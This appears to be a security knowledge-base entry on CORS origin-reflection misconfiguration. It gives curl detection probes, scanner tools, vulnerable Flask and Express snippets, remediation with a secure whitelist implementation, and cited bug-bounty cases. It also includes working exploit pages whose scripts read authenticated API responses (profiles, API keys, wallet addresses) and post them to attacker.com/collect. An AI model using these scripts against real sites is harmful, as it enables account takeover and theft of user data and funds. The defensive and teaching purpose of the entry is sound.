# CORS: Origin Reflection (Wildcard Mirroring)

**Category:** CORS Misconfiguration
**Severity:** Critical (with credentials), Medium (without)
**CVSS Range:** 7.5 - 9.8

## Attack Description

The server dynamically reflects whatever value is sent in the `Origin` request header back into the `Access-Control-Allow-Origin` response header. Combined with `Access-Control-Allow-Credentials: true`, this allows any attacker-controlled domain to make authenticated cross-origin requests and read the responses, effectively bypassing the Same-Origin Policy entirely.

This is the most common and most dangerous CORS misconfiguration. It typically occurs because developers need to support multiple origins but implement it by echoing the `Origin` header instead of validating against a whitelist.

## Prerequisites

1. Target reflects arbitrary `Origin` values in `Access-Control-Allow-Origin`
2. `Access-Control-Allow-Credentials: true` is set (for high-impact exploitation)
3. Victim must be authenticated (has active session cookies)
4. Victim must visit attacker-controlled page

## Exploitation Steps

### 1. Detection

```bash
# Send request with arbitrary Origin
curl -s -D- -H "Origin: https://evil.com" https://target.com/api/user | grep -i "access-control"

# Expected vulnerable response:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

### 2. Confirm Credential Forwarding

```bash
# Test with actual session cookie
curl -s -D- \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=<valid_session>" \
  https://target.com/api/sensitive-data
```

### 3. Build Exploit Page

```html
<html>
<body>
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  // Exfiltrate data
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: this.responseText
  });
};
req.open('GET', 'https://target.com/api/user/profile', true);
req.withCredentials = true;
req.send();
</script>
</body>
</html>
```

### 4. Advanced: Multi-Endpoint Chain

```javascript
// Chain requests to steal multiple data points
async function exploit() {
  const endpoints = [
    '/api/user/profile',
    '/api/user/api-keys',
    '/api/user/wallet-addresses',
    '/api/user/transactions'
  ];
  
  const stolen = {};
  for (const ep of endpoints) {
    const resp = await fetch('https://target.com' + ep, {
      credentials: 'include'
    });
    stolen[ep] = await resp.json();
  }
  
  // Exfiltrate all at once
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(stolen)
  });
}
exploit();
```

## Detection Method

### Manual Testing
- Send `Origin: https://evil.com` header on every API request
- Check if `Access-Control-Allow-Origin` mirrors the value
- Verify `Access-Control-Allow-Credentials: true` is present
- Test multiple endpoints (auth endpoints are high priority)

### Automated Tools
- **Corsy** (`s0md3v/Corsy`): Dedicated CORS misconfiguration scanner
- **CORScanner** (`chenjj/CORScanner`): Batch CORS scanning
- **CorsOne** (`omranisecurity/CorsOne`): Fast discovery tool
- **Burp Suite**: Match & Replace rule to add Origin header to all requests

### Code Review Indicators
```python
# Python/Flask - Vulnerable pattern
@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin')
    if origin:
        response.headers['Access-Control-Allow-Origin'] = origin  # BAD
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

```javascript
// Node/Express - Vulnerable pattern
app.use(cors({
  origin: true,  // Reflects all origins - BAD
  credentials: true
}));
```

## Remediation

1. **Whitelist specific origins**: Maintain a strict list of trusted origins
2. **Validate before reflecting**: Check Origin against whitelist, only set ACAO if trusted
3. **Never combine wildcard with credentials**: Browsers block `*` + credentials, but dynamic reflection achieves the same dangerous effect
4. **Set `Vary: Origin`**: Prevent cache poisoning when ACAO is dynamic
5. **Use SameSite cookies**: `SameSite=Strict` or `Lax` as defense-in-depth

```python
# Secure implementation
ALLOWED_ORIGINS = {'https://app.example.com', 'https://admin.example.com'}

@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Vary'] = 'Origin'
    return response
```

## Real Examples

1. **Bitcoin Exchange (PortSwigger, 2016)**: James Kettle found a major BTC exchange reflecting all origins with credentials. Could steal private API keys, disable notifications, enable 2FA lockout, and transfer all bitcoins. Patched in 20 minutes after report.

2. **HackerOne #426147 - niche.co (X/xAI)**: CORS misconfig on niche.co dynamically reflected client Origin with `credentials: true` and multiple methods enabled. Led to account takeover. Disclosed on HackerOne.

3. **HackerOne #235200**: Cross-origin resource sharing misconfig allowing user information theft.

4. **HackerOne #577969**: CORS misconfiguration enabling customer data theft.

## Web3 Context

DeFi frontends frequently split into separate origins (app, API, docs) and use permissive CORS to tie them together. Attack surfaces include:
- **RPC endpoint APIs** that expose wallet balances and transaction history
- **Backend APIs** that return session tokens, API keys, or user preferences
- **Admin panels** on separate subdomains that trust the main app origin
- **Bridge UIs** that communicate cross-origin for multi-chain operations

The bitcoin exchange case is the canonical example: CORS misconfig on a crypto platform's API directly enables fund theft.
